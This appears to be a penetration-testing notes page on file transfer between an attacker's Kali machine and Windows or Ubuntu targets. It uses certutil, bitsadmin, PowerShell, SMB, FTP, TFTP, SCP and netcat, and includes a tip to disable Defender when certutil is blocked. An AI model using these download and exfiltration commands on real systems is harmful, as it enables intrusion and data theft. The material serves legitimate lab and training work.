## File Transfer

UPDOG

Inside the attacker’s machine, we will setup an **updog** server. It is a replacement of the Python’s **SimpleHTTPServer**. It is useful for scenarios where a lightweight, quick-to-deploy HTTP server is needed.

To install the server, we will execute the following command:

```jsx
pip3 install updog

If you face error: externally-managed-environment follow below steps-
sudo apt install pypy3-venv 
Error: Unable to locate package pypy3-venv
source path/to/venv/bin/activate
pip3 install updog

Create a Virtual Environment
python3 -m venv my_env

source my_env/bin/activate

Find All Virtual Environments
find ~ -name "activate"

or python3 -m pip install updog --break-system-packages

```

![image.png](attachment:261ed759-fc38-42be-9bca-17807f8508ac:image.png)

After the installation is complete, we can run the server at port 80 using the following command:

```jsx
updog -p 80
```

![image.png](attachment:b4fe4496-7900-417b-93a6-a604c1ed24df:image.png)

## **wget**

To transfer the file, we can use the **wget** command. **wget** is a powerful command to download files from the web. It should be noted that while doing file transfer using wget in windows, we need to mention the **-o** (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., **WebResponseObject**. The command for wget in windows is:

```jsx
powershell wget http://192.168.188.130:80/user.txt -o user.txt
dir
type user.txt
```

![image.png](attachment:0af711ac-09e4-4d21-944d-935d6d5500a1:99c8ea3b-022a-43f8-b5c1-4a45ad69e958.png)

### **curl**

Curl is a powerful command-line tool, which can be used to transfer files using various networking protocols. Following will be the command to transfer the file:

```jsx
curl http://192.168.188.130:80/user.txt -o user.txt
```

![image.png](attachment:70697ce7-d848-4c35-89bb-98a6b4a882ac:image.png)

### **certutil**

**certutil** is a command-line utility included with the Windows operating system, designed for managing certificates and cryptographic elements. To transfer the file using certutil following command can be used:

```jsx
certutil -urlcache -f http://192.168.188.130:80/user.txt user.txt

**Note: if Defender is enabled certutil will be blocked, need to disable defender or try another method.**
```

![image.png](attachment:f161be58-d161-4642-b403-9c4f56b25544:image.png)

The **-split** option in certutil is used to split large files into smaller segments to perform the file transfer.

```jsx
certutil -urlcache -split -f  http://192.168.188.130:80/user.txt user.txt
```

![image.png](attachment:0c043557-092a-49a8-9448-45fb73176e1d:image.png)

### **bitsadmin**

**Bitsadmin** is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files. The command for file transfer is:

```jsx
bitsadmin /transfer job http://192.168.188.130:80/user.txt C:\Users\shank\user.txt
```

![image.png](attachment:d2bb29d6-a3fa-4761-9d19-83d88b34b9e6:image.png)

### **File transfer using PowerShell**

File transfer can be performed using PowerShell directly by running the following command:

```jsx
powershell (**New**-Object System.Net.WebClient).DownloadFile('http://192.168.188.130:80/user.txt', 'user.txt')
```

![image.png](attachment:225d9a1a-c25e-4671-b3d0-9c6f6cca5964:image.png)

### **File transfer using SMB server**

SMB is a protocol meant for communication to provide shared access to files, ports etc. within a network. In order to enable it we will use the **impacket-smbserver** script inside kali linux to share the files. Here we are giving the shared directory name as **share**, the significance of the share here is that it converts the file’s long path into a single share directory. Here we can give the full path of directory or the **pwd** as argument so that it takes the current directories path.

```jsx
impacket-smbserver share $(pwd) -smb2support
```

![image.png](attachment:ded9454b-9d31-47e0-ae98-273c82afb56c:image.png)

After the setup is done, we can execute the following command in the Windows machine to copy the files from the share folder.

```jsx
net use Z: \\192.168.188.130\share /user:kali kali
copy \\192.168.188.130\share\user.txt
```

![image.png](attachment:3f11e78f-eb1e-4b8c-9f4c-f930c5ae87e6:image.png)

To copy the file from Windows into our kali linux, we can use the following command:

```jsx
copy user.txt \\192.168.188.130\share\user.txt
```

![image.png](attachment:7230719a-0aaf-4898-b5ec-00f3c44cb3fd:image.png)

In order to transfer file from another linux machine like ubuntu, we can connect with the share folder using the **smbclient** tool and then after login, we can directly upload and download the file using put and get commands respectively.

```jsx
smbclient -L 192.168.188.130
smbclient "\\\\192.168.188.130\share"
ls
get user.txt
put user.txt
```

![image.png](attachment:b21afe92-9a37-4988-b0eb-0e3d611b430d:image.png)

![image.png](attachment:f4b5799b-14f3-450c-9801-2bf9fbdf20a9:image.png)

If you have GUI access:

```jsx
win+R
\\192.168.188.130
```

![image.png](attachment:d270696b-1fc2-4989-9f43-272a93b0013b:image.png)

### **File transfer using SCP**

**SCP (Secure Copy Protocol)** is a method for securely transferring files between a local system and a remote server, or between two remote servers. It operates over the **SSH (Secure Shell)** protocol, which ensures a secure connection over potentially insecure networks. It has the advantage of cross-platform usage such that it is supported by both linux and windows.

To copy the file from Windows to kali, we will be using the following command:

```jsx
scp user.txt kali@192.168.188.130:/tmp
```

![image.png](attachment:69ab5f03-7f15-4a20-9efb-9c45122e9f4a:image.png)

=========

To transfer the file from kali linux to the windows machine, we will use the following command:

scp user.txt shank@192.168.188.138:/C:/Temp

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSkXjRUZ5bMhCLxt2U5tv7dpzCPz6GzGJq2RoNcoxuSw0hNjIkMGjjM3bgKUfU1lgkTSNdKTPzAgkAkKbGiy25fSF7DOc_Y48c8DoORhrwInsgefeUu_KAsgfechBDNUxV4xZoR7j4XgQn1B1IN5Se-xiQeXT1Ol4Fk9tdaaRI3blHfTly8gPm4_JL-fQG/s16000/26.png)

### **File transfer using TFTP**

TFTP (Trivial File Transfer Protocol) is a basic and minimalistic protocol for file transfers over a network. It operates over the UDP rather than TCP, this choice helps keep the protocol lightweight but means it does not provide the reliability and error-checking that TCP offers. It works on UDP port 69.

To transfer a file from kali linux to windows machine, we will be using the following command inside the **Metasploit** framework:

use auxiliary/server/tftp

set srvhost 192.168.31.141

set tftproot /root/raj

run

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilq9VwtgsrSvoBEm2JyW9J1EgbRS0aN0WCvb3jHoVTErhimG0FpC1uSnkLnfQ3CWQycf8WCLHtWHxPUoHTvYcc6sQyhlgadylfYFeoWf7DSt5nYrDzQAtTqn83GbMzDigmF7fZDOXAUFc35cDU069BijgGdBiUXvru9dQbLRXVWQaho2GYTqef6ogBZusg/s16000/30.png)

To download the file, we will run the following command in windows machine:

tftp -i 192.168.31.219 GET ignite.txt

dir

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhubEAst_r1gAR5I-F_Wi2AfzoCcjDTjVHpMVYIDj_2nQIUHx6DDhcKGBAaQvN-BjPgWnoCHdhzhmywV6sk4ISZY2Cg6WAWD_EpIsBGjtsDQZHvKw9UiLAbNOs4eQBnMww3vEckEGgI1zT4GVS56E9xWK8Rc8o5CjI3xbItz_DEda0dyUGvRx5ZUJ_iU_CF/s16000/31.png)

### **File transfer using FTP**

FTP (File Transfer Protocol) is a longstanding and widely utilized protocol for transferring files across a network. It enables users to upload, download, and manage files on a remote server. To enable the FTP service, we are going to use the Metasploit framework. It can be noted that here we are keeping an authentication on the service rather than keeping the anonymous login.

Following will be the commands:

use auxiliary/server/ftp

set srvhost 192.168.31.141

set ftproot /root/raj

set ftpuser raj

set ftppass 123

run

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEho3ymok8i_lrQCexc7Y7j__oAD5M9Wv5fIHczxVKgDUBOXVJmzw8zBu6cRv_TIknFgl19mQTWRCPKQ1szZZc7bo9wJkvpCpqph9V00AVy4L12vCSnDVd_tLGoGUIGBP18dxqN7XjRbM6uSerPW6j9bArjM7sXSpXee65TCbeLlcXizHcUxc9A-82QlTxeq/s16000/35.png)

Once the server is started, the file can be downloaded after authenticating into the FTP server.

ftp 192.168.31.141

dir

get ignite.txt

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzSFeyz-wocghNeJF6wPdMxIhsgILMD9kxZccI11uMRVyu6lSFfndKEntORJC5MulsjOmGsD0tLzIg4IXnBbOAMs-DAlxVEWE_KGq34a3pEvTeM2rPvBeixsoMyHjpZUUFFs_c7h5-N9whaoJlOOUmElLQWbfgOuGyUAGy5H-V5INNEz9VbkdTY5eUSR2r/s16000/36.png)

We can also use the python FTP server using the pyftpdlib. It is a library of python which helps us to setup the FTP server on the machine. Here we will be using it to setup a FTP server on the kali machine.

First we will start with the installation using pip3.

pip3 install pyftpdlib

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHEMsrnS4gd4A8lmuM3W-pDGnIYUM28V8_o7pCZowljRE_g0y6jWLSTLpoLlArRvSNkwuXRb67MchIjzt0iCcPMGB2zxU1wfQDbix3AuvVNj2J2lohKzkgvdkH2V9u_nPffrNMH_aDaeLh8jGOHQgUqRa61bW3-6ptQWDSMMwPvzaDtHzvbnyfBbi2W72e/s16000/40.png)

After the installation is complete, we can start the FTP server using the authentication by the following command:

python3 -m pyftpdlib -w -p 21 -u ignite -P 123

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgH_pvdWXft83lA1CXCTrxiUwV1nkzPwzBB_sAOfXn-Tc_RdhxdiqcdRqzFqbG1txNdZxKCwONmkYkGGsIChdnH0-shHfR9P7EJuafkdK16dLrRAp0loUKPWnqjnWtF4ZJHKAiOJtuEzqyglxlB6k0TwGg9v8dySJeq2xOaj5sNOWpt5pQnBZXcfOHOj8c_/s16000/50.png)

Once the server is started we can authenticate into the FTP server from the windows machine and download the file. To upload the file we will use the put command and to download the file we will use the get command.

ftp 192.168.31.141

get ignite.txt

put C:\Users\raj\avni.txt

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhf7_kPTP66O8ENw313aT6yr339-P6r-AYexS43mRNLtT_dumO98TuRODSuOTEbajRfzdyU1Iw7-4IfNtGxcvmdufWo5mfjgF5OGA1lEcm6VJn0E42Bn6AQ834nPFNUj6rVdpbjChRnQiIJgMCQ5harGzSDH3QJMkNMgfElgNWcIUKjOWIJUFC_7WgVmNJ8/s16000/51.png)

To setup FTP server for Anonymous login, we will run the same command but without the username and password.

python -m pyftpdlib -w -p 21

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3woEt42UsulXTN3AAZ4OlixGPDguiEKyf1KgfrX8kKEv2KvtoFHn2np1URx2egZ9P2L2d77DaT8HDk4d0H1ESnLBegDKQBaDdBCd702a8Z6PWnmd8GtdEpxrNK60PRy8JBwNOMS6gaSjqfjUTmkJ3G8DL9ec9lth_-7J7QqfReyQe7QfsGX3soWdeuUTB/s16000/52.png)

Once the server is enabled for Anonymous login, we can perform it and view the files.

ftp 192.168.31.141

ls

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyt4LH6EujQIaG1ktPf4SRuzI5mRdwlhfH0oJTQ2J7bxKGuy33cPtS6qs3zA6Yc9fRkSpdlVCiSKb8UCJRGbkgEsRSAUHweS16eoQp54NEcZXgLvoJSzlTZo5n_M3XmZK1nUpA_LpKCw0S6cn7VCgOMytZXv5vV_KlmXytshOl_QlmjSi3d8bMzoOgoN7l/s16000/53.png)

### **Different methods to setup the server for file transfer**

To perform the file transfer we need to setup a server, besides using **updog**.

To setup a server using **PHP**, we can use the following command:

php -S 0.0.0.0:8081

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYvOOQLroJSIp_FgLy3uqgkQrInCQen8HhqInkolTxekU9LJCcahHk2KrYu2W0FUbsv47E9JI9rkFiJFzkCdmjzO1iKmTwaqKe-FtpAnaJrw2ZGkJwFNAFsuduyFeauo3aSZdqEQXoaJ0b0fgOj7grP5gbjfTsayFZNmqK_5dAOtWVCxIfSta8Z0VLztFw/s16000/60.png)

To setup a server using **python2**, we can use the following command:

python2 -m SimpleHTTPServer 80

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2gB0EhRBZRyJOng926oniYXXgZL1M2yHZJxrEcsSGx5UiPryr2-XAH7SzuVCmccq87hp907Gt6BW0b1Zu2onHl_Ty56QRpVBWjjLfUiUmYxkbJJDV1pFL_HZNk382_iXpaVhVgN2Zaq_zy9sKifwWGqFVgKb6c_b-Vl9I2R4b5J1bEMx6rvzB9-hyR4O-/s16000/61.png)

To setup a server using **python3**, we can use the following command:

python3 -m http.server 8000

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4y_VnJALVGhKZF5ak3RAxEoUFGt6cLlpX0R6ttoBy4_oZMaKtfOxaJp-1w9BWs1E6WG-HlTSWc5LnnjHV83_WVxsjkZreUDTdCuH2U56G0DhNiNGk2wqDyn438HoyktAlRb27zQTx69S48BCVqfRxqE4qnZlf2ExPpoLv9WscpnTwWzjANyCnoG7cteU1/s16000/62.png)

### **File transfer using Netcat**

Netcat, commonly known as **nc**, is a multifunctional networking tool designed for reading from and writing to network connections over TCP or UDP. Netcat can facilitate file transfers by establishing a simple client-server setup.

To transfer file in the kali machine from an Ubuntu machine we can use the following command inside kali:

nc -lvp 5555 > file.txt

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrEYjOpTYbrtwgv7KVe5eMJ4Qfk8ICdPJzQUlltKO2lkzgG2nAp4N1FZaioOdSCH3vkogEai1mKOhGqeAKN9D65RWIwLxRF27OLTZ2ZpFaE0fv3Vp3Jmh7dVCwE1_eZor0hrushOEBhxE5yYY1_8SDEuwTt_DYVGnSiUA3u6nScy3tK2N8p3DCeP4U8kPg/s16000/71.png)

Now we can run the following command in ubuntu to send the file to the kali machine:

ls

nc 192.168.31.141 5555 < file.txt

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8oS1X4RrOpN7Pvb3kWGBwwz-L0I0XAwFMttjuvTdeF8I-lQ5JrOq1Ub7jAVMFxPfkL8qfTSIZkcBIgOGpPF5b8Q_DYfq6mhzvixiGlUQosVu5FCL6vhG5YVwP3cION__k9kokA7rzKZ5iXuaOs5tbnkdl0r5_BaJrR2Ua71V4Q0jM_1aYxxtp2QXjx7NY/s16000/72.png)

Similarly, we can also receive files from a windows machine inside our kali linux. However, it should be noted that we the target windows machine should have the nc.exe binary to make this method work.

Following is the command we need to run on the windows machine:

nc.exe 192.168.31.141 5555 < data.txt

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIjzVyTrgfr4esOxQDfaVhP7QtyuCcWj5tYPG3Bzj646H8As3qIf8g1AtjvSUiRE07UvoqM9ojR5OaojlFI_0q5rXncAIuegubNwzzLICrpZI__EMQC973mahtaL7V0PUJ_JUhVdXCP7j9rSWIslfBnnoAjS40GRc2dVxEkEIdngrx3o8ag2rnfG313o8e/s16000/73.png)

To receive the file in the kali machine, we will run the following command:

nc -lvp 5555 > data.txt

cat data.txt

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6LU-K471evwFOeojlIiC0uJE84Wz0_3Z1oJcKP8h59pDfqQ2CEmpoj79KEs9G4Vxf-UhR4OR3SumX-nPUwbaBARiN6bLC520x8IOMnOuHFAbLe52HQTI0jFIkost4qII280ajayN66Dse9KTpjUTy_LzzhnYnvsMzxzFUuDokAG5O3bYQRegrQ2C_Uskw/s16000/74.png)

###
